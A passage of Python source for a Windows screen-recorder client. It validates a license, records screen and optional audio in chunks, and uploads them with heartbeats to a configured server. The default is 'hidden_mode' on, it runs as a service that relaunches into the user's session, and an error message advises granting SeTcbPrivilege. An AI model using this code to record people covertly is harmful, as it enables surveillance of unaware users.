"""
Screen Recorder Client
Records screen, validates license, and uploads to server
Enhanced with: multi-monitor, audio recording, pause/resume,
video compression, configurable region, and robust error handling
"""

import os
import sys
import tempfile
import logging
from pathlib import Path

# ============================================================================
# EARLY CRASH LOGGING - Capture any crashes before full logging setup
# This must happen BEFORE any other imports that might fail
# ============================================================================


def _get_log_dir():
    """Determine the best log directory, checking multiple locations."""
    # Priority 1: Installed location (C:\ScreenRecorderClient\ScreenRecSvc)
    installed_log_dir = Path("C:\\ScreenRecorderClient\\ScreenRecSvc")
    if installed_log_dir.exists():
        return installed_log_dir

    # Priority 2: Same directory as this script
    script_dir = Path(__file__).parent.resolve()
    script_log_dir = script_dir / "ScreenRecSvc"
    try:
        script_log_dir.mkdir(parents=True, exist_ok=True)
        return script_log_dir
    except (OSError, PermissionError):
        pass

    # Priority 3: User's temp directory as fallback
    temp_log_dir = Path(tempfile.gettempdir()) / "ScreenRecSvc"
    try:
        temp_log_dir.mkdir(parents=True, exist_ok=True)
        return temp_log_dir
    except (OSError, PermissionError):
        # Last resort: current directory
        return Path.cwd() / "ScreenRecSvc"


# Write early crash log immediately
_EARLY_LOG_DIR = _get_log_dir()
_EARLY_LOG_FILE = _EARLY_LOG_DIR / "client.log"
_EARLY_CRASH_FILE = _EARLY_LOG_DIR / "crash.log"


def _write_early_crash(exc_type, exc_value, exc_tb):
    """Write uncaught exceptions to crash log before Python exits."""
    import traceback

    try:
        with open(_EARLY_CRASH_FILE, "a", encoding="utf-8") as f:
            f.write(f"\n{'='*60}\n")
            f.write(f"UNCAUGHT EXCEPTION at {__import__('datetime').datetime.now()}\n")
            f.write(f"Process: {sys.executable}\n")
            f.write(f"Script: {__file__}\n")
            f.write(f"CWD: {os.getcwd()}\n")
            f.write(f"Log Dir: {_EARLY_LOG_DIR}\n")
            f.write(f"{'='*60}\n")
            traceback.print_exception(exc_type, exc_value, exc_tb, file=f)
            f.flush()
    except Exception:
        pass  # Can't do anything if this fails


# Install early crash handler
sys.excepthook = _write_early_crash

# ============================================================================
# PATH SETUP FOR SHARED MODULE
# ============================================================================
_script_dir = os.path.dirname(os.path.abspath(__file__))
_shared_same_level = os.path.join(_script_dir, "shared")
_shared_parent_level = os.path.join(_script_dir, "..", "shared")
if os.path.isdir(_shared_same_level):
    sys.path.insert(0, _shared_same_level)
else:
    sys.path.insert(0, _shared_parent_level)

# ============================================================================
# FULL LOGGING SETUP
# ============================================================================
LOG_DIR = _EARLY_LOG_DIR

_LOG_FILE = LOG_DIR / "client.log"
_log_formatter = logging.Formatter("%(asctime)s - %(levelname)s - %(message)s")

# Root logger - configure manually so we can add multiple handlers
_root_logger = logging.getLogger()
_root_logger.setLevel(logging.INFO)

# Stdout handler (NSSM will redirect this to service.log)
_stdout_handler = logging.StreamHandler(sys.stdout)
_stdout_handler.setFormatter(_log_formatter)
_root_logger.addHandler(_stdout_handler)

# Direct file handler - independent of NSSM, always written by the process itself
try:
    _file_handler = logging.FileHandler(str(_LOG_FILE), encoding="utf-8")
    _file_handler.setFormatter(_log_formatter)
    _root_logger.addHandler(_file_handler)
except OSError as _fh_err:
    sys.stdout.write(f"WARNING: Could not open log file {_LOG_FILE}: {_fh_err}\n")
    sys.stdout.flush()

logger = logging.getLogger(__name__)
logger.info("=" * 60)
logger.info("screen_recorder.py starting up...")
logger.info(f"Log file: {_LOG_FILE}")
logger.info(f"Crash log: {_EARLY_CRASH_FILE}")
logger.info(f"Python executable: {sys.executable}")
logger.info(f"Working directory: {os.getcwd()}")
logger.info(f"Script location: {__file__}")
logger.info(f"Log directory: {LOG_DIR}")
logger.info("=" * 60)

try:
    import cv2
    import numpy as np
    import mss
    import time
    import json
    import requests
    import threading
    import hashlib
    import queue
    import random
    import subprocess
    import wave
    from datetime import datetime, timezone
    from io import BytesIO
    from typing import Optional, Dict, Any, List, Tuple, Union
    from dataclasses import dataclass, field
    from enum import Enum
    import zipfile

    # Optional audio imports
    try:
        import pyaudio

        HAS_AUDIO = True
    except ImportError:
        HAS_AUDIO = False
        logger.warning("PyAudio not available, audio recording disabled")

    # Optional WebSocket client
    try:
        import socketio as socketio_client

        HAS_SOCKETIO = True
    except ImportError:
        HAS_SOCKETIO = False
        logger.warning("python-socketio not available, websocket disabled")
    logger.info("All imports successful")
except ImportError as _import_err:
    logger.error(f"Import error - missing dependency: {_import_err}")
    logger.error("Run: pip install -r requirements.txt")
    sys.exit(1)


try:
    from license_manager import LicenseManager, MachineIdentifier

    logger.info("license_manager imported successfully")
except ImportError as _lm_err:
    logger.error(f"Failed to import license_manager: {_lm_err}")
    logger.error(f"Shared path searched: {_shared_same_level}, {_shared_parent_level}")
    sys.exit(1)


class ClientState(Enum):
    """Client state enumeration"""

    INITIALIZING = "initializing"
    LICENSE_INVALID = "license_invalid"
    RECORDING = "recording"
    PAUSED = "paused"
    STOPPED = "stopped"
    ERROR = "error"


@dataclass
class UploadTask:
    """Represents a video upload task"""

    video_path: Path
    timestamp: datetime
    processed_path: Optional[Path] = None
    thumbnail_path: Optional[Path] = None
    audio_path: Optional[Path] = None
    retry_count: int = 0
    max_retries: int = 5
    last_error: Optional[str] = None

    def increment_retry(self) -> bool:
        """Increment retry count and return if retries remaining"""
        self.retry_count += 1
        return self.retry_count < self.max_retries


@dataclass
class Config:
    """Configuration manager for the client"""

    server_url: str = "http://localhost:5000"
    upload_interval: int = 300  # 5 minutes
    recording_fps: int = 10
    video_quality: int = 80
    chunk_duration: int = 60  # 1 minute per video chunk
    license_file: str = "license.key"
    hidden_mode: bool = True
    heartbeat_interval: int = 60  # seconds
    max_offline_storage_mb: int = 1000  # 1GB max offline storage
    retry_base_delay: float = 1.0  # Base delay for exponential backoff
    retry_max_delay: float = 300.0  # Max delay 5 minutes
    upload_speed_limit_kbps: int = 0  # 0 = unlimited, else limit in KB/s
    min_disk_space_mb: int = 500  # Minimum free disk space before recording

    # Multi-monitor and region selection
    monitor_selection: int = 1  # Primary monitor by default (1-indexed)
    region_x: int = 0
    region_y: int = 0
    region_width: int = 0  # 0 = full width
    region_height: int = 0  # 0 = full height

    # Audio recording
    enable_audio: bool = False
    audio_sample_rate: int = 44100
    audio_channels: int = 2

    # Video processing
    enable_compression: bool = True
    compression_quality: int = 23  # FFmpeg CRF value (lower = better quality)
    generate_thumbnails: bool = True
    thumbnail_pct: float = 0.1  # Generate thumbnail at 10% of video duration
    ffmpeg_path: str = "ffmpeg"

    # WebSocket
    use_websocket: bool = False
    websocket_url: str = "http://localhost:5000"

    def __post_init__(self):
        """Load configuration from file"""
        self._load_from_file()

    def _load_from_file(self) -> None:
        """Load configuration from file"""
        config_file = LOG_DIR / "config.json"
        if config_file.exists():
            try:
                with open(config_file, "r") as f:
                    data = json.load(f)
                    for key, value in data.items():
                        if hasattr(self, key):
                            setattr(self, key, value)
                logger.info("Configuration loaded from file")
            except (json.JSONDecodeError, IOError) as e:
                logger.warning(f"Failed to load config: {e}")

    def save_to_file(self) -> None:
        """Save configuration to file"""
        config_file = LOG_DIR / "config.json"
        try:
            with open(config_file, "w") as f:
                json.dump(self.__dict__, f, indent=2)
        except IOError as e:
            logger.error(f"Failed to save config: {e}")


class ThrottledFileReader:
    """File-like wrapper that throttles read speed for bandwidth-limited uploads."""

    def __init__(self, file_obj, speed_limit_kbps: int = 0, chunk_size: int = 8192):
        """
        Args:
            file_obj: Underlying file object to read from.
            speed_limit_kbps: Maximum speed in kilobytes per second. 0 = unlimited.
            chunk_size: Size of each read chunk in bytes.
        """
        self._file = file_obj
        self._speed_limit_kbps = speed_limit_kbps
        self._chunk_size = chunk_size
        self._bytes_read = 0
        self._start_time: Optional[float] = None

    def read(self, size: int = -1) -> bytes:
        if self._speed_limit_kbps <= 0:
            return self._file.read(size)

        if self._start_time is None:
            self._start_time = time.time()

        # Read in small chunks to allow throttling
        data = b""
        remaining = size if size > 0 else float("inf")

        while remaining > 0:
            to_read = min(self._chunk_size, remaining if remaining != float("inf") else self._chunk_size)
            chunk = self._file.read(to_read)
            if not chunk:
                break
            data += chunk
            self._bytes_read += len(chunk)
            remaining -= len(chunk)

            # Throttle: sleep if we're ahead of the allowed rate
            elapsed = time.time() - self._start_time
            allowed_bytes = self._speed_limit_kbps * 1024 * elapsed
            if self._bytes_read > allowed_bytes:
                sleep_time = (self._bytes_read - allowed_bytes) / (self._speed_limit_kbps * 1024)
                time.sleep(min(sleep_time, 1.0))  # Cap sleep at 1s to stay responsive

        return data

    def __getattr__(self, name):
        """Delegate all other attributes to the underlying file object."""
        return getattr(self._file, name)


class RetryHandler:
    """Handles retry logic with exponential backoff"""

    # Retryable error types - defined as class attribute to avoid import timing issues
    RETRYABLE_ERRORS = (
        requests.exceptions.ConnectionError,
        requests.exceptions.Timeout,
        requests.exceptions.ChunkedEncodingError,
    )

    def __init__(self, base_delay: float = 1.0, max_delay: float = 300.0, max_retries: int = 5):
        self.base_delay = base_delay
        self.max_delay = max_delay
        self.max_retries = max_retries

    def get_delay(self, retry_count: int) -> float:
        """Calculate delay with exponential backoff and jitter"""
        if retry_count <= 0:
            return 0

        # Exponential backoff
        delay = self.base_delay * (2 ** (retry_count - 1))

        # Add jitter (random factor between 0.5 and 1.5)
        jitter = random.uniform(0.5, 1.5)
        delay *= jitter

        # Cap at max delay
        return min(delay, self.max_delay)

    def should_retry(self, retry_count: int, error: Exception) -> bool:
        """Determine if we should retry based on error type and count"""
        if retry_count >= self.max_retries:
            return False

        # Retry on network errors, timeouts, and 5xx server errors
        if isinstance(error, RetryHandler.RETRYABLE_ERRORS):
            return True

        # Check for HTTP 5xx errors
        if isinstance(error, requests.exceptions.HTTPError):
            if hasattr(error, "response") and error.response is not None:
                return 500 <= error.response.status_code < 600

        return False


class OfflineQueue:
    """Manages offline video queue for when server is unavailable"""

    def __init__(self, queue_dir: Path, max_storage_mb: int = 1000):
        self.queue_dir = queue_dir
        self.queue_dir.mkdir(parents=True, exist_ok=True)
        self.max_storage_bytes = max_storage_mb * 1024 * 1024
        self.queue: List[UploadTask] = []
        self._lock = threading.Lock()  # Thread-safe access to queue (#13 fix)
        self._load_queue()

    def _load_queue(self) -> None:
        """Load pending uploads from disk"""
        queue_file = self.queue_dir / "upload_queue.json"
        if queue_file.exists():
            try:
                with open(queue_file, "r") as f:
                    data = json.load(f)
                    for item in data:
                        task = UploadTask(
                            video_path=Path(item["video_path"]),
                            timestamp=datetime.fromisoformat(item["timestamp"]),
                            retry_count=item.get("retry_count", 0),
                            last_error=item.get("last_error"),
                        )
                        if task.video_path.exists():
                            self.queue.append(task)
                        else:
                            logger.warning(f"[OfflineQueue] Queued file missing, skipping: {task.video_path}")
                logger.info(f"[OfflineQueue] Loaded {len(self.queue)} pending uploads from disk")
            except (json.JSONDecodeError, IOError) as e:
                logger.warning(f"[OfflineQueue] Failed to load queue: {e}")
        else:
            logger.info(f"[OfflineQueue] No existing queue file at {queue_file}")

    def _save_queue(self) -> None:
        """Save pending uploads to disk"""
        queue_file = self.queue_dir / "upload_queue.json"
        try:
            data = [
                {
                    "video_path": str(task.video_path),
                    "timestamp": task.timestamp.isoformat(),
                    "retry_count": task.retry_count,
                    "last_error": task.last_error,
                }
                for task in self.queue
            ]
            with open(queue_file, "w") as f:
                json.dump(data, f, indent=2)
        except IOError as e:
            logger.error(f"Failed to save queue: {e}")

    def add(self, video_path: Path) -> bool:
        """Add a video to the offline queue"""
        with self._lock:
            current_size = self.get_total_size()
            video_size = video_path.stat().st_size if video_path.exists() else 0
            logger.info(
                f"[OfflineQueue] Attempting to add {video_path.name} (size: {video_size} bytes, current queue size: {current_size} bytes)"
            )

            if current_size + video_size > self.max_storage_bytes:
                logger.warning(
                    f"[OfflineQueue] Offline storage limit reached ({current_size} + {video_size} > {self.max_storage_bytes}), removing oldest videos"
                )
                self._remove_oldest_until_fits(video_size)

            task = UploadTask(video_path=video_path, timestamp=datetime.now(timezone.utc))
            self.queue.append(task)
            self._save_queue()
            logger.info(
                f"[OfflineQueue] Added video to offline queue: {video_path.name} (queue now has {len(self.queue)} items)"
            )
            return True

    def remove(self, task: UploadTask) -> None:
        """Remove a task from the queue"""
        with self._lock:
            if task in self.queue:
                self.queue.remove(task)
                self._save_queue()

    def get_next(self) -> Optional[UploadTask]:
        """Get the next task to process"""
        with self._lock:
            if self.queue:
                return self.queue[0]
            return None

    def get_total_size(self) -> int:
        """Get total size of queued videos"""
        return sum(task.video_path.stat().st_size for task in self.queue if task.video_path.exists())

    def _remove_oldest_until_fits(self, needed_space: int) -> None:
        """Remove oldest videos until there's enough space (caller must hold lock)"""
        while self.queue and self.get_total_size() + needed_space > self.max_storage_bytes:
            oldest = self.queue.pop(0)
            if oldest.video_path.exists():
                oldest.video_path.unlink()
                logger.info(f"Removed oldest video from queue: {oldest.video_path.name}")
            self._save_queue()

    def is_empty(self) -> bool:
        """Check if queue is empty"""
        with self._lock:
            return len(self.queue) == 0

    def count(self) -> int:
        """Get number of items in queue"""
        with self._lock:
            return len(self.queue)


class HeartbeatManager:
    """Manages heartbeat communication with server"""

    def __init__(self, config: Config, license_key: str, machine_id: str):
        self.config = config
        self.license_key = license_key
        self.machine_id = machine_id
        self.last_heartbeat: Optional[datetime] = None
        self.server_reachable = False
        self._stop_event = threading.Event()
        self._thread: Optional[threading.Thread] = None

    def start(self) -> None:
        """Start heartbeat thread"""
        self._stop_event.clear()
        self._thread = threading.Thread(target=self._heartbeat_loop, daemon=True)
        self._thread.start()
        logger.info("Heartbeat manager started")

    def stop(self) -> None:
        """Stop heartbeat thread"""
        self._stop_event.set()
        if self._thread:
            self._thread.join(timeout=5)
        logger.info("Heartbeat manager stopped")

    def _heartbeat_loop(self) -> None:
        """Heartbeat loop"""
        logger.info("[HEARTBEAT] Heartbeat loop started")
        while not self._stop_event.is_set():
            try:
                self._send_heartbeat()
            except Exception as e:
                logger.error(f"[HEARTBEAT] Error in heartbeat loop: {e}", exc_info=True)

            # Wait for next interval or stop signal
            logger.debug(f"[HEARTBEAT] Sleeping for {self.config.heartbeat_interval} seconds")
            self._stop_event.wait(self.config.heartbeat_interval)

    def _send_heartbeat(self) -> None:
        """Send heartbeat to server"""
        url = f"{self.config.server_url}/api/v1/heartbeat"
        logger.debug(f"[HEARTBEAT] Sending heartbeat to {url}")

        headers = {
            "X-License-Key": self.license_key,
            "X-Machine-ID": self.machine_id,
            "Content-Type": "application/json",
        }

        try:
            response = requests.post(
                url,
                headers=headers,
                json={"timestamp": datetime.now(timezone.utc).isoformat()},
                timeout=10,
            )

            if response.status_code == 200:
                self.last_heartbeat = datetime.now(timezone.utc)
                self.server_reachable = True
                logger.debug("[HEARTBEAT] Heartbeat successful")
            else:
                self.server_reachable = False
                logger.warning(f"[HEARTBEAT] Heartbeat failed: HTTP {response.status_code} - {response.text[:100]}")

        except requests.exceptions.RequestException as e:
            self.server_reachable = False
            logger.warning(f"[HEARTBEAT] Heartbeat failed (server unreachable): {e}")


class ScreenRecorder:
    """Main screen recorder class with enhanced features"""

    def __init__(self, config: Optional[Config] = None):
        self.config = config or Config()
        self.state = ClientState.INITIALIZING
        self.license_valid = False
        self.license_data: Optional[Dict[str, Any]] = None
        self.recording_thread: Optional[threading.Thread] = None
        self.upload_thread: Optional[threading.Thread] = None
        self.video_chunks: List[Path] = []
        self._video_chunks_lock = threading.Lock()  # Thread-safe access to video_chunks
        self.current_video: Optional[Path] = None
        self.video_writer: Optional[cv2.VideoWriter] = None
        # MSS is not thread-safe, create instance in recording thread
        self.sct: Optional[mss.mss] = None
        self.license_manager = LicenseManager()
        self.machine_id = MachineIdentifier.get_machine_id()
        self.license_key: Optional[str] = None
        self._stop_event = threading.Event()
        self._pause_event = threading.Event()
        self._owner_runner: Optional["HiddenRunner"] = None  # Set by HiddenRunner

        # Register signal handlers for graceful shutdown
        if sys.platform == "win32":
            import signal as signal_module

            signal_module.signal(signal_module.SIGINT, self._signal_handler)
            signal_module.signal(signal_module.SIGTERM, self._signal_handler)
        else:
            import signal as signal_module

            signal_module.signal(signal_module.SIGINT, self._signal_handler)
            signal_module.signal(signal_module.SIGTERM, self._signal_handler)
            signal_module.signal(signal_module.SIGHUP, self._signal_handler)

        # Audio recording
        self.audio_stream: Optional[Any] = None
        self.audio_queue: Optional[queue.Queue] = None
        self.audio_thread: Optional[threading.Thread] = None
        self.audio_enabled = self.config.enable_audio and HAS_AUDIO
        # WebSocket client
        self.socket_client: Optional[Any] = None
        self._ws_reconnect_attempts = 0
        self._ws_max_reconnect_attempts = 10
        self._ws_connected = False
        if self.config.use_websocket and HAS_SOCKETIO:
            self._connect_websocket()
        # Initialize retry handler
        self.retry_handler = RetryHandler(
            base_delay=self.config.retry_base_delay,
            max_delay=self.config.retry_max_delay,
        )

        # Initialize offline queue
        self.offline_queue = OfflineQueue(
            queue_dir=LOG_DIR / "offline_queue",
            max_storage_mb=self.config.max_offline_storage_mb,
        )

        # Heartbeat manager (initialized after license validation)
        self.heartbeat_manager: Optional[HeartbeatManager] = None

        # Load public key for license validation
        self._load_public_key()

        # Video storage
        self.video_dir = LOG_DIR / "recordings"
        self.video_dir.mkdir(parents=True, exist_ok=True)

        # Thumbnail storage
        self.thumbnail_dir = LOG_DIR / "thumbnails"
        self.thumbnail_dir.mkdir(parents=True, exist_ok=True)

        logger.info(f"ScreenRecorder initialized. Machine ID: {self.machine_id}")

    def _connect_websocket(self) -> None:
        """Connect to WebSocket server with reconnection logic."""
        if not self.config.use_websocket or not HAS_SOCKETIO:
            return

        try:
            self.socket_client = socketio_client.Client(logger=False, engineio_logger=False)

            # Register event handlers
            @self.socket_client.event
            def connect():
                self._ws_connected = True
                self._ws_reconnect_attempts = 0
                logger.info("[WEBSOCKET] Connected to server")

            @self.socket_client.event
            def disconnect():
                self._ws_connected = False
                logger.info("[WEBSOCKET] Disconnected from server")

            @self.socket_client.event
            def connect_error(data):
                self._ws_connected = False
                logger.warning(f"[WEBSOCKET] Connection error: {data}")

            self.socket_client.connect(self.config.websocket_url, wait_timeout=5)
            logger.info("[WEBSOCKET] Client connected")
        except Exception as ws_err:
            self._ws_connected = False
            logger.warning(f"[WEBSOCKET] Connection failed: {ws_err}")
            self.socket_client = None

    def _reconnect_websocket(self) -> bool:
        """Attempt to reconnect to WebSocket with exponential backoff.

        Returns:
            bool: True if reconnection successful, False otherwise.
        """
        if self._ws_reconnect_attempts >= self._ws_max_reconnect_attempts:
            logger.error(f"[WEBSOCKET] Max reconnection attempts ({self._ws_max_reconnect_attempts}) reached")
            return False

        self._ws_reconnect_attempts += 1
        delay = min(2**self._ws_reconnect_attempts, 30)  # Exponential backoff, max 30s
        logger.info(
            f"[WEBSOCKET] Reconnecting (attempt {self._ws_reconnect_attempts}/{self._ws_max_reconnect_attempts}) in {delay}s"
        )
        time.sleep(delay)
        self._connect_websocket()
        return self._ws_connected

    def _signal_handler(self, signum, frame) -> None:
        """Handle shutdown signals gracefully.

        Args:
            signum: Signal number
            frame: Current stack frame
        """
        signal_name = {
            2: "SIGINT",
            15: "SIGTERM",
            1: "SIGHUP",
        }.get(signum, f"Signal {signum}")

        logger.info(f"[SIGNAL] Received {signal_name}, initiating graceful shutdown...")

        # Set stop event to signal all threads to stop
        self._stop_event.set()

        # Clear pause event if set (in case we're paused)
        self._pause_event.clear()

        # Update state
        self.state = ClientState.STOPPED

        # Stop the HiddenRunner main loop if we were launched from one (#7 fix)
        if self._owner_runner is not None:
            self._owner_runner.running = False

        logger.info("[SIGNAL] Graceful shutdown initiated, waiting for threads to complete...")

    def _load_public_key(self) -> None:
        """Load public key embedded in the application.

        Search order:
          1. LOG_DIR/public_key.pem  (ScreenRecSvc folder - easiest to update without rebuilding)
          2. Same directory as this script (embedded at build time)
          3. C:\\ScreenRecorderClient\\public_key.pem (installed root)
        """
        search_paths = [
            LOG_DIR / "public_key.pem",
            Path(__file__).parent / "public_key.pem",
            Path("C:\\ScreenRecorderClient") / "public_key.pem",
        ]
        for key_path in search_paths:
            if key_path.exists():
                try:
                    with open(key_path, "r") as f:
                        self.license_manager.load_public_key(f.read())
                    logger.info(f"Public key loaded from: {key_path}")
                    return
                except Exception as e:
                    logger.warning(f"Failed to load public key from {key_path}: {e}")
        logger.warning(
            "Public key file not found in any search path. "
            "Searched: " + ", ".join(str(p) for p in search_paths) + ". "
            "Copy the server's public_key.pem to one of these locations."
        )

    def validate_license(self, license_key: Optional[str] = None) -> Tuple[bool, str]:
        """Validate the license"""
        logger.info("[LICENSE] Starting license validation...")
        if license_key is None:
            # Search for license file in multiple locations
            search_paths = [
                LOG_DIR / self.config.license_file,
                Path(_script_dir) / self.config.license_file,
                Path(os.environ.get("PROGRAMFILES", "C:\\Program Files")) / "ScreenRecSvc" / self.config.license_file,
            ]
            logger.debug(f"[LICENSE] Searching for license in paths: {search_paths}")
            license_path = None
            for p in search_paths:
                if p.exists():
                    license_path = p
                    logger.info(f"[LICENSE] Found license file at: {p}")
                    break
            if license_path:
                with open(license_path, "r") as f:
                    license_key = f.read().strip()
                self.license_key = license_key
                logger.info(f"[LICENSE] License file loaded from: {license_path}")
            else:
                searched = ", ".join(str(p) for p in search_paths)
                logger.error(f"[LICENSE] No license file found. Searched: {searched}")
                self.state = ClientState.LICENSE_INVALID
                return False, "No license file found"

        logger.debug(f"[LICENSE] Validating license key: {license_key[:20]}... for machine: {self.machine_id}")
        is_valid, result = self.license_manager.validate_license(license_key, self.machine_id)

        if is_valid:
            self.license_valid = True
            self.license_data = result
            self.license_key = license_key
            logger.info(f"[LICENSE] License validated successfully. Expires: {result['expires_at']}")
            return True, result
        else:
            self.license_valid = False
            self.state = ClientState.LICENSE_INVALID
            logger.error(f"[LICENSE] License validation failed: {result}")
            return False, result

    def get_screen_size(self, sct) -> Tuple[int, int]:
        """Get the primary monitor size"""
        monitor = sct.monitors[1]  # Primary monitor
        return monitor["width"], monitor["height"]

    def _get_video_path(self) -> Path:
        """Generate a unique video file path"""
        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        video_path = self.video_dir / f"rec_{timestamp}_{self.machine_id[:8]}.mp4"
        logger.debug(f"[PATH] Generated video path: {video_path}")
        return video_path

    def _get_capture_dimensions(self, sct) -> Tuple[int, int, int, int]:
        """
        Get capture dimensions based on monitor selection and region settings
        Returns: (width, height, offset_x, offset_y)
        """
        # Validate monitor selection
        monitor_idx = self.config.monitor_selection
        if monitor_idx < 1 or monitor_idx >= len(sct.monitors):
            logger.warning(f"Invalid monitor selection {monitor_idx}, using primary monitor")
            monitor_idx = 1

        monitor = sct.monitors[monitor_idx]
        monitor_width = monitor["width"]
        monitor_height = monitor["height"]
        monitor_left = monitor["left"]
        monitor_top = monitor["top"]

        # Calculate region
        region_width = self.config.region_width
        region_height = self.config.region_height
        region_x = self.config.region_x
        region_y = self.config.region_y

        # If region dimensions are 0, use full monitor
        if region_width == 0:
            region_width = monitor_width
        if region_height == 0:
            region_height = monitor_height

        # Ensure region is within monitor bounds
        if region_x < 0:
            region_x = 0
        if region_y < 0:
            region_y = 0
        if region_x + region_width > monitor_width:
            region_x = monitor_width - region_width
        if region_y + region_height > monitor_height:
            region_y = monitor_height - region_height

        logger.info(
            f"[CAPTURE] Monitor {monitor_idx}: {monitor_width}x{monitor_height} at ({monitor_left},{monitor_top})"
        )
        logger.info(f"[CAPTURE] Region: {region_width}x{region_height} at ({region_x},{region_y}) relative to monitor")

        return region_width, region_height, region_x, region_y

    def _get_monitor_region(self, sct, monitor_idx: int) -> dict:
        """
        Get the monitor region dictionary for MSS based on monitor selection and region settings
        """
        # Validate monitor selection
        if monitor_idx < 1 or monitor_idx >= len(sct.monitors):
            logger.warning(f"Invalid monitor selection {monitor_idx}, using primary monitor")
            monitor_idx = 1

        monitor = sct.monitors[monitor_idx]

        # Calculate region
        region_width = self.config.region_width
        region_height = self.config.region_height
        region_x = self.config.region_x
        region_y = self.config.region_y

        # If region dimensions are 0, use full monitor
        if region_width == 0:
            region_width = monitor["width"]
        if region_height == 0:
            region_height = monitor["height"]

        # Ensure region is within monitor bounds
        if region_x < 0:
            region_x = 0
        if region_y < 0:
            region_y = 0
        if region_x + region_width > monitor["width"]:
            region_x = monitor["width"] - region_width
        if region_y + region_height > monitor["height"]:
            region_y = monitor["height"] - region_height

        return {
            "left": monitor["left"] + region_x,
            "top": monitor["top"] + region_y,
            "width": region_width,
            "height": region_height,
        }

    def start_recording(self) -> bool:
        """Start screen recording"""
        logger.info("[START] Attempting to start recording...")
        if not self.license_valid:
            logger.error("[START] Cannot start recording: Invalid license")
            return False

        if self.state == ClientState.RECORDING:
            logger.warning("[START] Recording already in progress")
            return True

        # Pre-recording disk space check
        import shutil

        try:
            usage = shutil.disk_usage(self.video_dir if hasattr(self, "video_dir") and self.video_dir else Path.home())
            min_free_mb = getattr(self.config, "min_disk_space_mb", 100)
            if usage.free < min_free_mb * 1024 * 1024:
                logger.error(
                    "[START] Insufficient disk space: %.1f MB free (minimum: %d MB)",
                    usage.free / (1024 * 1024),
                    min_free_mb,
                )
                return False
        except Exception as e:
            logger.warning("[START] Could not check disk space: %s", e)

        # Windows Session 0 isolation check:
        # Services run in Session 0 which has no access to the user's display.
        # Detect this and relaunch the recorder process inside the active user session.
        if sys.platform == "win32" and self._is_session_zero():
            logger.warning(
                "[START] Running in Windows Session 0 (service context). "
                "Screen capture will not work here. Attempting to relaunch "
                "in the active user desktop session..."
            )
            launched = self._relaunch_in_user_session()
            if launched:
                logger.info(
                    "[START] Successfully relaunched in user session. "
                    "This service-side process will now idle and keep the service alive."
                )
                # Keep the service process alive so Windows does not mark the service
                # as failed, but do NOT start capture here — the relaunched user-session
                # process will handle that.
                self.state = ClientState.PAUSED
                return True
            else:
                logger.error(
                    "[START] Could not relaunch in user session. "
                    "The service is running as LocalSystem in Session 0 and cannot access "
                    "the interactive desktop. Screen capture is not possible from this context. "
                    "FIX: Configure the service to 'Log On As' the target user account "
                    "via Services.msc (Properties -> Log On tab), or re-run the installer "
                    "with a user account. Alternatively, grant the LocalSystem account "
                    "the 'Act as part of the operating system' (SeTcbPrivilege) privilege "
                    "via secpol.msc -> Local Policies -> User Rights Assignment."
                )
                # Enter PAUSED state so the service stays alive (Windows won't report
                # it as failed) without wasting disk writing all-black video files.
                # The user must reconfigure the service logon account to fix this.
                self.state = ClientState.PAUSED
                return True

        self._stop_event.clear()
        self.state = ClientState.RECORDING
        logger.info("[START] State set to RECORDING")

        # Start recording thread
        logger.info("[START] Starting recording thread...")
        self.recording_thread = threading.Thread(target=self._record_loop, daemon=True)
        self.recording_thread.start()
        logger.info("[START] Recording thread started")

        # Start upload thread
        logger.info("[START] Starting upload thread...")
        self.upload_thread = threading.Thread(target=self._upload_loop, daemon=True)
        self.upload_thread.start()
        logger.info("[START] Upload thread started")

        # Start heartbeat manager
        if self.license_key:
            logger.info("[START] Starting heartbeat manager...")
            self.heartbeat_manager = HeartbeatManager(self.config, self.license_key, self.machine_id)
            self.heartbeat_manager.start()
            logger.info("[START] Heartbeat manager started")
        else:
            logger.warning("[START] No license key available, skipping heartbeat manager")

        logger.info("[START] Recording started successfully")
        return True

    def pause_recording(self) -> bool:
        """Pause screen recording"""
        if self.state != ClientState.RECORDING:
            logger.warning(f"[PAUSE] Cannot pause - current state: {self.state}")
            return False

        self._pause_event.set()
        self.state = ClientState.PAUSED
        logger.info("[PAUSE] Recording paused")

        # Pause audio if enabled
        if self.audio_stream:
            try:
                # PyAudio streams can be stopped to pause recording
                self.audio_stream.stop_stream()
                logger.info("[PAUSE] Audio stream paused")
            except Exception as e:
                logger.error(f"[PAUSE] Error pausing audio: {e}")

        return True

    def resume_recording(self) -> bool:
        """Resume paused recording"""
        if self.state != ClientState.PAUSED:
            logger.warning(f"[RESUME] Cannot resume - current state: {self.state}")
            return False

        self._pause_event.clear()
        self.state = ClientState.RECORDING
        logger.info("[RESUME] Recording resumed")

        # Resume audio if enabled
        if self.audio_stream:
            try:
                # PyAudio streams can be started to resume recording
                self.audio_stream.start_stream()
                logger.info("[RESUME] Audio stream resumed")
            except Exception as e:
                logger.error(f"[RESUME] Error resuming audio: {e}")

        return True

    def stop_recording(self, timeout: float = 5.0) -> None:
        """Stop screen recording gracefully.

        Args:
            timeout: Maximum time in seconds to wait for threads to complete
        """
        logger.info("[STOP] Stopping recording...")
        self._stop_event.set()
        self._pause_event.clear()  # Clear pause if set
        self.state = ClientState.STOPPED
        logger.info("[STOP] State set to STOPPED, stop event set")

        # Wait for recording thread to finish
        if self.recording_thread is not None and self.recording_thread.is_alive():
            logger.info(f"[STOP] Waiting for recording thread to complete (timeout: {timeout}s)...")
            self.recording_thread.join(timeout=timeout)
            if self.recording_thread.is_alive():
                logger.warning("[STOP] Recording thread did not complete within timeout")
            else:
                logger.info("[STOP] Recording thread completed")

        # Wait for upload thread to finish
        if self.upload_thread is not None and self.upload_thread.is_alive():
            logger.info(f"[STOP] Waiting for upload thread to complete (timeout: {timeout}s)...")
            self.upload_thread.join(timeout=timeout)
            if self.upload_thread.is_alive():
                logger.warning("[STOP] Upload thread did not complete within timeout")
            else:
                logger.info("[STOP] Upload thread completed")

        if self.video_writer is not None:
            logger.info("[STOP] Releasing video writer")
            try:
                self.video_writer.release()
            except Exception as e:
                logger.error(f"[STOP] Error releasing video writer: {e}")
            self.video_writer = None

        if self.heartbeat_manager:
            logger.info("[STOP] Stopping heartbeat manager")
            self.heartbeat_manager.stop()

        logger.info("[STOP] Recording stopped")

    @staticmethod
    def _get_current_session_id() -> int:
        """Get the Windows session ID of the current process"""
        try:
            import ctypes
            import ctypes.wintypes

            pid = os.getpid()
            session_id = ctypes.wintypes.DWORD(0)
            ctypes.windll.kernel32.ProcessIdToSessionId(pid, ctypes.byref(session_id))
            return session_id.value
        except Exception:
            return -1

    @staticmethod
